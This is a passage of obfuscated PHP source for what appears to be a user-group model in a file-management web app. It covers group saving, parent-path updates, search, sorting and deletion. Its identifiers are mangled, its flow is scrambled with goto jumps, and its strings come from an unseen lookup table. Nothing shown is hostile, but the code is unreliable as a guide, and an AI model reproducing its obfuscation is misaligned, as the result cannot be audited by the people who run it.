$c·‚ŠõÎ”[$e«®¬ƒÄ¯»[28]] != $F¨ñ›·£¤‰[$e«®¬ƒÄ¯»[28]]) { $this->_clearChildrenCache($F¨ñ›·£¤‰); } return $this->where(array($e«®¬ƒÄ¯»[1755] => $E¦Ó×¯ô…µ))->save($c·‚ŠõÎ”); goto díäº­†œÏ; díäº­†œÏ: } private function _clearChildrenCache($D†‰‚×‘×) { $c’¸ååÇìâ =& $_SERVER[Šº]; $eÛôŠ“è‡ì = array($c’¸ååÇìâ[561] => array($c’¸ååÇìâ[520], $D†‰‚×‘×[$c’¸ååÇìâ[494]] . $D†‰‚×‘×[$c’¸ååÇìâ[1677]] . $c’¸ååÇìâ[521])); $fš˜‘Š = $this->field($c’¸ååÇìâ[1677])->where($eÛôŠ“è‡ì)->select(); foreach ($fš˜‘Š as $Bàí¼Ãù£) { $this->cacheFunctionClear($c’¸ååÇìâ[1756], $Bàí¼Ãù£[$c’¸ååÇìâ[1677]]); $this->cacheFunctionClear($c’¸ååÇìâ[1750], $Bàí¼Ãù£[$c’¸ååÇìâ[1677]]); } } private function _changeChildLevel($dŒ¶¥Àæãô, $d¾ñäé²‹„, $C¼”Í“ƒì = false) { goto dğ¼ğİ‚Ï; A‡ËØŠÄ†ˆ: $this->_clearChildrenCache($dŒ¶¥Àæãô); $this->where($Dª¢ªÒÌÓ)->data($aáŠ®Ûˆƒ)->save(); goto cóª©É³ßÎ; dğ¼ğİ‚Ï: $F–İàĞÕ’Ä =& $_SERVER[Šº]; $bêì·ä¼õ¯ = $dŒ¶¥Àæãô[$F–İàĞÕ’Ä[494]] . $dŒ¶¥Àæãô[$F–İàĞÕ’Ä[1677]] . $F–İàĞÕ’Ä[47]; $c÷åÍ·ÅÚ© = $d¾ñäé²‹„[$F–İàĞÕ’Ä[494]] . $d¾ñäé²‹„[$F–İàĞÕ’Ä[1677]] . $F–İàĞÕ’Ä[47] . $dŒ¶¥Àæãô[$F–İàĞÕ’Ä[1677]] . $F–İàĞÕ’Ä[47]; goto B†„‚ÉÓ±; B†„‚ÉÓ±: if ($C¼”Í“ƒì) { $c÷åÍ·ÅÚ© = $d¾ñäé²‹„[$F–İàĞÕ’Ä[494]] . $d¾ñäé²‹„[$F–İàĞÕ’Ä[1677]] . $F–İàĞÕ’Ä[47]; } $Dª¢ªÒÌÓ = array($F–İàĞÕ’Ä[561] => array($F–İàĞÕ’Ä[520], $dŒ¶¥Àæãô[$F–İàĞÕ’Ä[494]] . $dŒ¶¥Àæãô[$F–İàĞÕ’Ä[1677]] . $F–İàĞÕ’Ä[521])); $aáŠ®Ûˆƒ = array($F–İàĞÕ’Ä[561] => array($F–İàĞÕ’Ä[569], "\x72\145\x70\x6c\x61\143\x65\x28\x70\141\x72\145\x6e\x74\114\x65\166\x65\x6c\x2c\x27{$bêì·ä¼õ¯}\47\54\x27{$c÷åÍ·ÅÚ©}\x27\51")); goto A‡ËØŠÄ†ˆ; cóª©É³ßÎ: } public function setNamePinyin($FŠÓ­ÀŠ¼½, $d—ä·İéÑæ = false) { $EÑ—î£Ó×¬ =& $_SERVER[Šº]; if (!$d—ä·İéÑæ) { $cßÌÔºŞèĞ = $this->getInfoSimple($FŠÓ­ÀŠ¼½); $d—ä·İéÑæ = $cßÌÔºŞèĞ[$EÑ—î£Ó×¬[28]]; } if (!Input::check($d—ä·İéÑæ, $EÑ—î£Ó×¬[564])) { $this->metaSet($FŠÓ­ÀŠ¼½, $EÑ—î£Ó×¬[451], null); $this->metaSet($FŠÓ­ÀŠ¼½, $EÑ—î£Ó×¬[450], null); return; } $Cœß°šâÂ = array($EÑ—î£Ó×¬[451] => str_replace($EÑ—î£Ó×¬[50], $EÑ—î£Ó×¬[33], Pinyin::encode($d—ä·İéÑæ)), $EÑ—î£Ó×¬[450] => Pinyin::encode($d—ä·İéÑæ, $EÑ—î£Ó×¬[565])); $this->metaSet($FŠÓ­ÀŠ¼½, $Cœß°šâÂ); } protected function groupStatus($Fš •ùø³Í, $a´æÔµ×†µ) { goto b¢ØšËğØÏ; c˜îè¯×¸ö: if ($a´æÔµ×†µ == $BÍ´³®‡·[87]) { $C£íŠ×í’æ = $this->parentLevelArray($eÛ¥¥Èë—”[$BÍ´³®‡·[494]]); } else { $F³ë©ğåÀÄ = array($BÍ´³®‡·[561] => array($BÍ´³®‡·[520], $eÛ¥¥Èë—”[$BÍ´³®‡·[494]] . $eÛ¥¥Èë—”[$BÍ´³®‡·[1677]] . $BÍ´³®‡·[521])); $C£íŠ×í’æ = $this->where($F³ë©ğåÀÄ)->field($BÍ´³®‡·[1677])->select(); $C£íŠ×í’æ = array_to_keyvalue($C£íŠ×í’æ, $BÍ´³®‡·[33], $BÍ´³®‡·[1677]); } $C£íŠ×í’æ[] = $eÛ¥¥Èë—”[$BÍ´³®‡·[1677]]; $B•ÖáÌ¿Ùå = array(); goto BêŒ™¨÷ä ; BêŒ™¨÷ä : foreach ($C£íŠ×í’æ as $Fš •ùø³Í) { $B•ÖáÌ¿Ùå[] = array($BÍ´³®‡·[1677] => $Fš •ùø³Í, $BÍ´³®‡·[93] => $BÍ´³®‡·[711], $BÍ´³®‡·[371] => $a´æÔµ×†µ); } return Model($BÍ´³®‡·[1757])->addAll($B•ÖáÌ¿Ùå, array(), !0); goto eªÈÍÊ¸âõ; b¢ØšËğØÏ: $BÍ´³®‡· =& $_SERVER[Šº]; $eÛ¥¥Èë—” = $this->getInfoSimple($Fš •ùø³Í); if (!$eÛ¥¥Èë—”) { return !1; } goto c˜îè¯×¸ö; eªÈÍÊ¸âõ: } protected function groupRemove($Aâ±¿éî) { goto f‹Ğ«˜¥ÉŒ; bÖß¤‘•ã: if (!$DÄµÁÜº¨Ò || $DÄµÁÜº¨Ò[$D­äÙ‚ëĞ„[485]] == 0) { return !1; } $d¿Ó›÷¦³« = $this->getInfoSimple($DÄµÁÜº¨Ò[$D­äÙ‚ëĞ„[485]]); $this->_changeChildLevel($DÄµÁÜº¨Ò, $d¿Ó›÷¦³«, !0); goto Dø©ØÏÀ; AÊíˆ·›©î: Model($D­äÙ‚ëĞ„[788])->groupRootRemove($Aâ±¿éî); return $this->where($Féâòù‘ç§)->delete(); goto Fğ•çà®•Å; f‹Ğ«˜¥ÉŒ: $D­äÙ‚ëĞ„ =& $_SERVER[Šº]; $Féâòù‘ç§ = array($D­äÙ‚ëĞ„[1677] => $Aâ±¿éî); $DÄµÁÜº¨Ò = $this->where($Féâòù‘ç§)->find(); goto bÖß¤‘•ã; Dø©ØÏÀ: $this->where(array($D­äÙ‚ëĞ„[485] => $Aâ±¿éî))->save(array($D­äÙ‚ëĞ„[485] => $DÄµÁÜº¨Ò[$D­äÙ‚ëĞ„[485]])); Model($D­äÙ‚ëĞ„[1757])->where($Féâòù‘ç§)->delete(); Model($D­äÙ‚ëĞ„[1758])->where($Féâòù‘ç§)->delete(); goto AÊíˆ·›©î; Fğ•çà®•Å: } protected function groupSort($BŒÌ£„»Àš) { $B„½˜ÏŠ˜Õ =& $_SERVER[Šº]; $añ‹¦¢ Ê– = array(); foreach ($BŒÌ£„»Àš as $Eµñ‘„¹äÔ => $b¬¦·•öß) { $añ‹¦¢ Ê–[] = array($B„½˜ÏŠ˜Õ[1677], $b¬¦·•öß, $B„½˜ÏŠ˜Õ[1700], $Eµñ‘„¹äÔ + 1); } $this->saveAll($añ‹¦¢ Ê–); } public function listData() { $eõ†±”Óõ© = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eõ†±”Óõ©[$_SERVER[Šº][366]]); return $eõ†±”Óõ©; } private function _makeOrder($Eø²çˆÂïê = '') { goto dÎ†¥£–í¼; dÎ†¥£–í¼: $dÓŸ±¶õîé =& $_SERVER[Šº]; $cÚåæÎŞÄÎ = array($dÓŸ±¶õîé[1677], $dÓŸ±¶õîé[28], $dÓŸ±¶õîé[1663], $dÓŸ±¶õîé[193]); $d›‰ŒÍ²Ò = array($dÓŸ±¶õîé[435] => $dÓŸ±¶õîé[436], $dÓŸ±¶õîé[437] => $dÓŸ±¶õîé[438]); goto aù›ô™ñ­ø; aù›ô™ñ­ø: $a§¡ğ·‹Ø£ = Input::get($dÓŸ±¶õîé[442], $dÓŸ±¶õîé[7], $dÓŸ±¶õîé[1681], $cÚåæÎŞÄÎ); $F™ ƒÎí°£ = Input::get($dÓŸ±¶õîé[443], $dÓŸ±¶õîé[7], $dÓŸ±¶õîé[1759], array($dÓŸ±¶õîé[1759], $dÓŸ±¶õîé[437])); $F™ ƒÎí°£ = $d›‰ŒÍ²Ò[$F™ ƒÎí°£]; goto dóªÂ»ÌŒÊ; dóªÂ»ÌŒÊ: $Eø²çˆÂïê = $Eø²çˆÂïê . "{$a§¡ğ·‹Ø£}\40{$F™ ƒÎí°£}\54\x20\147\x72\157\165\x70\x49\x44\40\141\163\x63"; return $this->order($Eø²çˆÂïê); goto F³»İì¥‘¡; F³»İì¥‘¡: } public function listChild($Fí‹ã“³¡‘) { $eÙ©š×¶¤ã =& $_SERVER[Šº]; $A¬ŠÍ‘Í³ë = $this->where(array($eÙ©š×¶¤ã[485] => $Fí‹ã“³¡‘))->_makeOrder()->selectPage(200); $this->_listDataApply($A¬ŠÍ‘Í³ë[$eÙ©š×¶¤ã[366]]); return $A¬ŠÍ‘Í³ë; } public function listByID($EòÅ¬ŞÔé‰) { $c³ï‡Ù›Û± =& $_SERVER[Šº]; if (!$EòÅ¬ŞÔé‰) { return array(); } $AŒ×Ğ™½– = array($c³ï‡Ù›Û±[1677] => array($c³ï‡Ù›Û±[7], $EòÅ¬ŞÔé‰)); $e§¡îšºæ = $this->where($AŒ×Ğ™½–)->select(); $this->_listDataApply($e§¡îšºæ); return $e§¡îšºæ; } public function listSearch($FÏé—Á…·) { goto báÀÄÂœ†œ; cÉ”š¶×İ…: $F„‡‚¨È£ = $F„‡‚¨È£ ? $F„‡‚¨È£ : array($e¼Æ—Â‹½[366] => array(), $e¼Æ—Â‹½[363] => array()); if (!$F„‡‚¨È£ || count($F„‡‚¨È£[$e¼Æ—Â‹½[366]]) < 5 && Input::check($aî¦ ÄœÛ, $e¼Æ—Â‹½[315])) { goto BÚ™å¼§Ï; A…Ç¶øÑÖî: $F„‡‚¨È£[$e¼Æ—Â‹½[363]][$e¼Æ—Â‹½[365]] = ceil($F„‡‚¨È£[$e¼Æ—Â‹½[363]][$e¼Æ—Â‹½[364]] / $F„‡‚¨È£[$e¼Æ—Â‹½[363]][$e¼Æ—Â‹½[360]]); goto e›±ôŸéñÚ; BÚ™å¼§Ï: $a¢¨Ì½”— = $this->groupChildrenAll($fÌ™àÕŠª§); $DŠ­¯¸Øã = $this->_searchFromMeta($e¼Æ—Â‹½[450], $aî¦ ÄœÛ, 10, $a¢¨Ì½”—); $f¾ŞÄÔ«°½ = $this->_searchFromMeta($e¼Æ—Â‹½[451], $aî¦ ÄœÛ, 10, $a¢¨Ì½”—); goto aä‹ÕšŒÈ; aä‹ÕšŒÈ: $bèˆ²ŠìÌ = array_merge($DŠ­¯¸Øã, $f¾ŞÄÔ«°½, $F„‡‚¨È£[$e¼Æ—Â‹½[366]]); $F„‡‚¨È£[$e¼Æ—Â‹½[366]] = array_unique_by_key($bèˆ²ŠìÌ, $e¼Æ—Â‹½[1677]); $F„‡‚¨È£[$e¼Æ—Â‹½[363]][$e¼Æ—Â‹½[364]] = count($F„‡‚¨È£[$e¼Æ—Â‹½[366]]); goto A…Ç¶øÑÖî; e›±ôŸéñÚ: } $this->_listDataApply($F„‡‚¨È£[$e¼Æ—Â‹½[366]]); goto eëÅá©„ƒ; báÀÄÂœ†œ: $e¼Æ—Â‹½ =& $_SERVER[Šº]; $aî¦ ÄœÛ = $FÏé—Á…·[$e¼Æ—Â‹½[1760]]; $fÌ™àÕŠª§ = isset($FÏé—Á…·[$e¼Æ—Â‹½[1761]]) ? $FÏé—Á…·[$e¼Æ—Â‹½[1761]] : !1; goto a„‘Ûñ‡âí; a„‘Ûñ‡âí: if (!trim($aî¦ ÄœÛ)) { return !1; } $aî¦ ÄœÛ = str_replace($e¼Æ—Â‹½[1762], $e¼Æ—Â‹½[1763], $aî¦ ÄœÛ); $AŸ’›á¿ßÒ = array($e¼Æ—Â‹½[1677] => array($e¼Æ—Â‹½[379], "{$aî¦ ÄœÛ}\x25"), $e¼Æ—Â‹½[28] => array($e¼Æ—Â‹½[379], "\x25{$aî¦ ÄœÛ}\45"), $e¼Æ—Â‹½[945] => $e¼Æ—Â‹½[1764]); goto DÁ…š÷ø¿î; DÁ…š÷ø¿î: if ($fÌ™àÕŠª§) { $Eà†¤œ¼¾® = $this->getInfoSimple($fÌ™àÕŠª§); $Fƒš…î…ãŒ = $Eà†¤œ¼¾®[$e¼Æ—Â‹½[494]] . $fÌ™àÕŠª§ . $e¼Æ—Â‹½[521]; $AŸ’›á¿ßÒ = array($AŸ’›á¿ßÒ, array($e¼Æ—Â‹½[494] => array($e¼Æ—Â‹½[379], $Fƒš…î…ãŒ))); } $AŸ’›á¿ßÒ = $this->parseWhereLike($AŸ’›á¿ßÒ); $F„‡‚¨È£ = $this->_makeOrder()->where($AŸ’›á¿ßÒ)->selectPage(20); goto cÉ”š¶×İ…; eëÅá©„ƒ: return $F„‡‚¨È£; goto EˆŠÌ¤Êè; EˆŠÌ¤Êè: } protected function groupChildrenAll($a‹ŒØáÍè) { $D²ÏŞ†»© =& $_SERVER[Šº]; if (!$a‹ŒØáÍè) { return !1; } if (is_string($a‹ŒØáÍè)) { $a‹ŒØáÍè = array($a‹ŒØáÍè); } $AáÃ‰Õ †… = $a‹ŒØáÍè; foreach ($a‹ŒØáÍè as $e°æç†Ôä’) { $a ›„š—ä = $this->getInfoSimple($e°æç†Ôä’); $FÜ•„ô†™¼ = array($D²ÏŞ†»©[494] => array($D²ÏŞ†»©[379], $a ›„š—ä[$D²ÏŞ†»©[494]] . $e°æç†Ôä’ . $D²ÏŞ†»©[521])); $aˆÃÅé‚ = $this->field($D²ÏŞ†»©[1677])->where($FÜ•„ô†™¼)->select(); $AáÃ‰Õ †… = array_merge($AáÃ‰Õ †…, array_to_keyvalue($aˆÃÅé‚, $D²ÏŞ†»©[33], $D²ÏŞ†»©[1677])); } return array_unique($AáÃ‰Õ †…); } private function _searchFromMeta($EŞã»÷ÊØ‹, $A™…İŒèá, $d¡÷öŸÍ, $B°–¹ÇÏ‘ì) { goto B”Ü¬ß”‡æ; e¸†ÄÎºŠ: $Cêƒ³Ã“öÑ = $this->parseWhereLike($Cêƒ³Ã“öÑ); if ($B°–¹ÇÏ‘ì) { $Cêƒ³Ã“öÑ[$d‚¬“‹°ñ[1677]] = array($d‚¬“‹°ñ[7], $B°–¹ÇÏ‘ì); } $Eğô®ˆä¶° = Model($d‚¬“‹°ñ[1765])->where($Cêƒ³Ã“öÑ)->limit($d¡÷öŸÍ)->select(); goto E‰‹í‹°ÅÊ; aÄ˜ÆÑò«: if (!$Cö…ß²Ù¶‘) { return array(); } return $Cö…ß²Ù¶‘; goto c¨Ë‹¤¡¾; E‰‹í‹°ÅÊ: if (!$Eğô®ˆä¶°) { return array(); } $Eğô®ˆä¶° = array_to_keyvalue($Eğô®ˆä¶°, $d‚¬“‹°ñ[33], $d‚¬“‹°ñ[1677]); $Cö…ß²Ù¶‘ = $this->where(array($d‚¬“‹°ñ[1755] => array($d‚¬“‹°ñ[7], $Eğô®ˆä¶°)))->select(); goto aÄ˜ÆÑò«; B”Ü¬ß”‡æ: $d‚¬“‹°ñ =& $_SERVER[Šº]; $A™…İŒèá = strtolower($A™…İŒèá); $Cêƒ³Ã“öÑ = array($d‚¬“‹°ñ[93] => $EŞã»÷ÊØ‹, $d‚¬“‹°ñ[371] => array($d‚¬“‹°ñ[379], "\45{$A™…İŒèá}\x25")); goto e¸†ÄÎºŠ; c¨Ë‹¤¡¾: } protected function _listDataApplyItem($d¯ò…º¦ãñ) { $a°¬Ÿˆá¿¾ = array($d¯ò…º¦ãñ); $this->_listDataApply($a°¬Ÿˆá¿¾); return $a°¬Ÿˆá¿¾[0]; } protected function _listDataApply(&$Eˆ‡Çõõ³) { goto aİİôŠÉ¼å; aãÂÈšèÃ: $this->_listAppendChildren($Eˆ‡Çõõ³); $this->_listAppendChildrenMember($Eˆ‡Çõõ³); $this->_listAppendMeta($Eˆ‡Çõõ³, $C‰¹¡ÜÍŠİ); goto C¦¼µ‹†¥Ã; aİİôŠÉ¼å: $AÌòÈôĞì =& $_SERVER[Šº]; if (!$Eˆ‡Çõõ³) { return; } $C‰¹¡ÜÍŠİ = array_to_keyvalue($Eˆ‡Çõõ³, $AÌòÈôĞì[33], $AÌòÈôĞì[1677]); goto aãÂÈšèÃ; C¦¼µ‹†¥Ã: $this->_listAppendParent($Eˆ‡Çõõ³); $this->_listAppendSourceRoot($Eˆ‡Çõõ³, $C‰¹¡ÜÍŠİ); goto E¼ÈË†ÂËä; E¼ÈË†ÂËä: } private function _listAppendChildren(&$Dé ‰‚ƒ¦¸) { goto A£µŠ‚²Ñ; A£µŠ‚²Ñ: $e„£”—ğğ£ =& $_SERVER[Šº]; $FÈ­‚‡• = array_to_keyvalue($Dé ‰‚ƒ¦¸, $e„£”—ğğ£[33], $e„£”—ğğ£[1677]); $bÌ’ªš±í¹ = array($e„£”—ğğ£[485] => array($e„£”—ğğ£[7], $FÈ­‚‡•)); goto a¨¢¶Ä¨×õ; b­ğâáòĞÚ: foreach ($Dé ‰‚ƒ¦¸ as &$cƒ©Ö‰—‚à) { $B·ÊØµ±Æ = $cƒ©Ö‰—‚à[$e„£”—ğğ£[1677]]; $cƒ©Ö‰—‚à[$e„£”—ğğ£[1767]] = isset($C´Ä®ÀÓ­†[$B·ÊØµ±Æ]) ? intval($C´Ä®ÀÓ­†[$B·ÊØµ±Æ]) : !1; } unset($cƒ©Ö‰—‚à); goto E á˜ÖÏù; a¨¢¶Ä¨×õ: $cœ¹‡ ù®µ = array($e„£”—ğğ£[485], $e„£”—ğğ£[1766] => $e„£”—ğğ£[487]); $E«œÍâä†è = $this->field($cœ¹‡ ù®µ)->where($bÌ’ªš±í¹)->group($e„£”—ğğ£[485])->select(); $C´Ä®ÀÓ­† = array_to_keyvalue($E«œÍâä†è, $e„£”—ğğ£[485], $e„£”—ğğ£[487]); goto b­ğâáòĞÚ; E á˜ÖÏù: } private function _listAppendChildrenMember(&$f¡·™œ™) { goto AÀ¦—ˆøÎö; cñ¤Ò•¥§: $bĞÃ˜’æõ = array($eŠ§‘ç«•[1677], $eŠ§‘ç«•[1766] => $eŠ§‘ç«•[487]); $Bç˜†ÎÃ = Model($eŠ§‘ç«•[1758])->field($bĞÃ˜’æõ)->where($C‡Ÿ§¡âµñ)->group($eŠ§‘ç«•[1677])->select(); $b ß°±èëõ = array_to_keyvalue($Bç˜†ÎÃ, $eŠ§‘ç«•[1677], $eŠ§‘ç«•[487]); goto a»°ø¥÷§ø; a»°ø¥÷§ø: foreach ($f¡·™œ™ as &$fÊ°ÎŒ¨•÷) { $eõ‡Ù»Œˆ› = $fÊ°ÎŒ¨•÷[$eŠ§‘ç«•[1677]]; $fÊ°ÎŒ¨•÷[$eŠ§‘ç«•[1768]] = isset($b ß°±èëõ[$eõ‡Ù»Œˆ›]) ? intval($b ß°±èëõ[$eõ‡Ù»Œˆ›]) : !1; } unset($fÊ°ÎŒ¨•÷); goto FÛ·İ†‰Âƒ; AÀ¦—ˆøÎö: $eŠ§‘ç«• =& $_SERVER[Šº]; $D‰š”•ÔĞÆ = array_to_keyvalue($f¡·™œ™, $eŠ§‘ç«•[33], $eŠ§‘ç«•[1677]); $C‡Ÿ§¡âµñ = array($eŠ§‘ç«•[1677] => array($eŠ§‘ç«•[7], $D‰š”•ÔĞÆ)); goto cñ¤Ò•¥§; FÛ·İ†‰Âƒ: } private function _listAppendMeta(&$bÉæÃ®‚¯, $d¦‹¿õïÓ) { goto A×ÁÍŞÒ‰; A×ÁÍŞÒ‰: $A¤ø«³‘”î =& $_SERVER[Šº]; $b¹á¡°½Œİ = array($A¤ø«³‘”î[1677] => array($A¤ø«³‘”î[7], $d¦‹¿õïÓ)); $fîÃŒš†šó = Model($A¤ø«³‘”î[1757])->where($b¹á¡°½Œİ)->select(); goto Bİ·÷í»…·; Bİ·÷í»…·: $fîÃŒš†šó = array_to_keyvalue_group($fîÃŒš†šó, $A¤ø«³‘”î[1677]); foreach ($fîÃŒš†šó as &$fƒÆÏÁ¿İ) { $fƒÆÏÁ¿İ = array_to_keyvalue($fƒÆÏÁ¿İ, $A¤ø«³‘”î[93], $A¤ø«³‘”î[371]); } unset($fƒÆÏÁ¿İ); goto EÂÒòİ¹Œ‰; EÂÒòİ¹Œ‰: foreach ($bÉæÃ®‚¯ as &$e»´©Òˆ…ø) { $e»´©Òˆ…ø[$A¤ø«³‘”î[452]] = array(); if (isset($fîÃŒš†šó[$e»´©Òˆ…ø[$A¤ø«³‘”î[1677]]])) { $e»´©Òˆ…ø[$A¤ø«³‘”î[452]] = $fîÃŒš†šó[$e»´©Òˆ…ø[$A¤ø«³‘”î[1677]]]; } } unset($e»´©Òˆ…ø); goto AÈô…’Æš; AÈô…’Æš: } protected function parentLevelArray($aÖÆ‹Ûùºô) { $Aô—ë‰°„Ì =& $_SERVER[Šº]; $aÖÆ‹Ûùºô = explode($Aô—ë‰°„Ì[47], trim($aÖÆ‹Ûùºô, $Aô—ë‰°„Ì[47])); $aÖÆ‹Ûùºô = array_remove_value($aÖÆ‹Ûùºô, $Aô—ë‰°„Ì[504]); return $aÖÆ‹Ûùºô; } private function _listAppendParent(&$aÌÎšÑÂ°÷) { goto A¿ˆœ±ğ…Œ; A¿ˆœ±ğ…Œ: $BĞµº»£Éã =& $_SERVER[Šº]; $b‡ãœÔ‹šÆ = array(); foreach ($aÌÎšÑÂ°÷ as &$bò©‡¤§¼¯) { $b‡ãœÔ‹šÆ[$bò©‡¤§¼¯[$BĞµº»£Éã[1677]]] = $bò©‡¤§¼¯[$BĞµº»£Éã[28]]; $dÍŸõ‰ŸŒ = $this->parentLevelArray($bò©‡¤§¼¯[$BĞµº»£Éã[494]]); foreach ($dÍŸõ‰ŸŒ as $cÄ½­¤¾Ñê) { if (!isset($b‡ãœÔ‹šÆ[$cÄ½­¤¾Ñê])) { $b‡ãœÔ‹šÆ[$cÄ½­¤¾Ñê] = 0; } } } goto a‚å‚©©ì“; a‚å‚©©ì“: unset($bò©‡¤§¼¯); foreach ($b‡ãœÔ‹šÆ as $d¬«íõÂ·¶ => $BãÓ»»µ) { if ($BãÓ»»µ) { continue; } $BˆÂöíğÚî = $this->getInfoSimple($d¬«íõÂ·¶); $b‡ãœÔ‹šÆ[$d¬«íõÂ·¶] = $BˆÂöíğÚî[$BĞµº»£Éã[28]]; } $BÃ£Î÷”Â„ = $GLOBALS[$BĞµº»£Éã[6]][$BĞµº»£Éã[88]][$BĞµº»£Éã[1769]]; goto A¡„Üğ˜Õ; A¡„Üğ˜Õ: if ($GLOBALS[$BĞµº»£Éã[492]] == $BĞµº»£Éã[87]) { $BÃ£Î÷”Â„ = !1; } foreach ($aÌÎšÑÂ°÷ as &$bò©‡¤§¼¯) { $dÍŸõ‰ŸŒ = $this->parentLevelArray($bò©‡¤§¼¯[$BĞµº»£Éã[494]]); $e’ƒùÎ´á = $BĞµº»£Éã[33]; foreach ($dÍŸõ‰ŸŒ as $d¬«íõÂ·¶ => $cÄ½­¤¾Ñê) { if ($BÃ£Î÷”Â„ && $d¬«íõÂ·¶ == 0) { continue; } $e’ƒùÎ´á .= $b‡ãœÔ‹šÆ[$cÄ½­¤¾Ñê] . $BĞµº»£Éã[8]; } if ($dÍŸõ‰ŸŒ) { $e’ƒùÎ´á .= $bò©‡¤§¼¯[$BĞµº»£Éã[28]]; } $bò©‡¤§¼¯[$BĞµº»£Éã[498]] = str_replace($BĞµº»£Éã[503], $BĞµº»£Éã[8], $e’ƒùÎ´á); } unset($bò©‡¤§¼¯); goto fŒôø±šøº; fŒôø±šøº: } private function _listAppendSourceRoot(&$aÇèíÃù³», $b¾õÊæ‰–) { goto dÃã‚é®ÂØ; aˆÑáÊˆí®: foreach ($aÇèíÃù³» as &$fï¦–•›à) { $fï¦–•›à[$bî™©‰ÏŞ[85]] = $B¶˜—æÑŞß[$fï¦–•›à[$bî™©‰ÏŞ[1677]]] ? $B¶˜—æÑŞß[$fï¦–•›à[$bî™©‰ÏŞ[1677]]] : array(); } unset($fï¦–•›à); goto c¿——á†¦; dÃ „ªĞ: $B¶˜—æÑŞß = Model($bî™©‰ÏŞ[788])->order($bî™©‰ÏŞ[1771])->field($F‘óâ§„Ô)->where($d¿ØšĞªé)->select(); $B¶˜—æÑŞß = array_to_keyvalue($B¶˜—æÑŞß, $bî™©‰ÏŞ[491]); $B¶˜—æÑŞß = array_remove_key($B¶˜—æÑŞß, $bî™©‰ÏŞ[491]); goto aˆÑáÊˆí®; dÃã‚é®ÂØ: $bî™©‰ÏŞ =& $_SERVER[Šº]; $d¿ØšĞªé = array($bî™©‰ÏŞ[411] => SourceModel::TYPE_GROUP, $bî™©‰ÏŞ[485] => 0, $bî™©‰ÏŞ[491] => array($bî™©‰ÏŞ[7], $b¾õÊæ‰–)); $F‘óâ§„Ô = $bî™©‰ÏŞ[1770]; goto dÃ „ªĞ; c¿——á†¦: } protected function groupMerge($fˆ·•ôÈ‡‡) { $fˆ·•ôÈ‡‡ = array_values(array_unique($fˆ·•ôÈ‡‡)); $cŸáÑíÅ– = array(); for ($CÊ…Áæä‘ = 0; $CÊ…Áæä‘ < count($fˆ·•ôÈ‡‡); $CÊ…Áæä‘++) { $F­¸¶œÌ¾· = !1; for ($dà§¨À‘ˆã = 0; $dà§¨À‘ˆã < count($fˆ·•ôÈ‡‡); $dà§¨À‘ˆã++) { if ($CÊ…Áæä‘ == $dà§¨À‘ˆã) { continue; } if ($this->isParentOf($fˆ·•ôÈ‡‡[$dà§¨À‘ˆã], $fˆ·•ôÈ‡‡[$CÊ…Áæä‘])) { $F­¸¶œÌ¾· = !0; break; } } if (!$F­¸¶œÌ¾·) { $cŸáÑíÅ–[] = $fˆ·•ôÈ‡‡[$CÊ…Áæä‘]; } } return $cŸáÑíÅ–; } protected function isParentOf($dÒí–‹Í‰¢, $A¹¹‘¼ëÀŸ) { goto dšìªœ½Ì; c®„ğÒñŞó: return !1; goto BåÒÏ¿‹½ã; bœ­ÂÕÙÏ: $Fß‚ˆ‘æœ = $this->getInfoSimple($A¹¹‘¼ëÀŸ); $Fùç«›¦ä = $CÕŠµÚ’•[$F¹®¾µ«‹°[494]] . $dÒí–‹Í‰¢ . $F¹®¾µ«‹°[47]; if (substr($Fß‚ˆ‘æœ[$F¹®¾µ«‹°[494]], 0, strlen($Fùç«›¦ä)) == $Fùç«›¦ä) { return !0; } goto c®„ğÒñŞó; dšìªœ½Ì: $F¹®¾µ«‹° =& $_SERVER[Šº]; if (!$dÒí–‹Í‰¢ || !$A¹¹‘¼ëÀŸ || $dÒí–‹Í‰¢ == $A¹¹‘¼ëÀŸ) { return !1; } $CÕŠµÚ’• = $this->getInfoSimple($dÒí–‹Í‰¢); goto bœ­ÂÕÙÏ; BåÒÏ¿‹½ã: } public function groupShowRoot($C²¬¢âá¡Ñ, $bŒ†µ¹Óß» = false) { goto EÕØ£à·ç±; EÕØ£à·ç±: $FÀĞÛ½½µÈ =& $_SERVER[Šº]; $a®ÄÏ‰·¬ = $this->getInfo($C²¬¢âá¡Ñ); if (!$a®ÄÏ‰·¬) { return array(); } goto b’¢ë¨áÙÊ; b‹è ö¦±: return $Fƒ‡Ç¹Ê; goto eÄ…ï†İ¼—; e¾¡œ¸¸¦‰: if ($bŒ†µ¹Óß» && count($fˆÊÅÏ¼…) == 1) { return $Fƒ‡Ç¹Ê; } if (!$a®ÄÏ‰·¬[$FÀĞÛ½½µÈ[452]] || !isset($a®ÄÏ‰·¬[$FÀĞÛ½½µÈ[452]][$FÀĞÛ½½µÈ[1753]]) || $a®ÄÏ‰·¬[$FÀĞÛ½½µÈ[452]][$FÀĞÛ½½µÈ[1753]] == $FÀĞÛ½½µÈ[1727]) { return $this->groupShowRoot($fˆÊÅÏ¼…[count($fˆÊÅÏ¼…) - 1], $bŒ†µ¹Óß»); } if ($a®ÄÏ‰·¬[$FÀĞÛ½½µÈ[452]][$FÀĞÛ½½µÈ[1753]] == $FÀĞÛ½½µÈ[356]) { $D¹Öï„ƒ… = explode($FÀĞÛ½½µÈ[47], $a®ÄÏ‰·¬[$FÀĞÛ½½µÈ[452]][$FÀĞÛ½½µÈ[1754]]); if ($D¹Öï„ƒ…) { $Fƒ‡Ç¹Ê = array_merge($Fƒ‡Ç¹Ê, $D¹Öï„ƒ…); } } goto b‹è ö¦±; b’¢ë¨áÙÊ: $fˆÊÅÏ¼… = $this->parentLevelArray($a®ÄÏ‰·¬[$FÀĞÛ½½µÈ[494]]); $Fƒ‡Ç¹Ê = array($C²¬¢âá¡Ñ); if (count($fˆÊÅÏ¼…) == 0) { return $Fƒ‡Ç¹Ê; } goto e¾¡œ¸¸¦‰; eÄ…ï†İ¼—: } protected function resetParentLevel() { $CÚâ™©¾—‹ =& $_SERVER[Šº]; $BÌµ“…Û‰è = $CÚâ™©¾—‹[1677]; $B¹îÀ“¯ = $this->select(); $B¹îÀ“¯ = array_to_keyvalue($B¹îÀ“¯, $BÌµ“…Û‰è); foreach ($B¹îÀ“¯ as $FŒŞÓù¢‰Û) { goto F·Ã¢âîù…; FÈ±ôÍ½„¿: $E¸İò£¸²ù[] = 0; $E¸İò£¸²ù = $CÚâ™©¾—‹[47] . implode($CÚâ™©¾—‹[47], array_reverse($E¸İò£¸²ù)) . $CÚâ™©¾—‹[47]; 